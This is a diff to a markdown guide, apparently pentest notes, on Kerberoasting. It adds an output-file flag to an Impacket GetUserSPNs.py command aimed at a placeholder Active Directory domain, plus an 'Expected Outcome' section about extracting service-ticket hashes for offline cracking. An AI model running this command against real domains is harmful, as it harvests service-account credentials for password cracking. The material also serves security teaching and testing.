@@ -41,4 +41,14 @@ source ~/.bashrc
 
 ## Command Example:
 ```bash
-python3 GetUserSPNs.py CONTOSO.LOCAL/john.doe -dc-ip 10.0.0.5
+python3 GetUserSPNs.py CONTOSO.LOCAL/john.doe -dc-ip 10.0.0.5 -outputfile kerberostickets.txt
+````
+
+## Expected Outcome
+
+TGS requests sent for SPNs saved in keberostickets.txt
+
+RC4-encrypted Kerberos service tickets returned
+
+Hashes extracted and saved for offline cracking
+
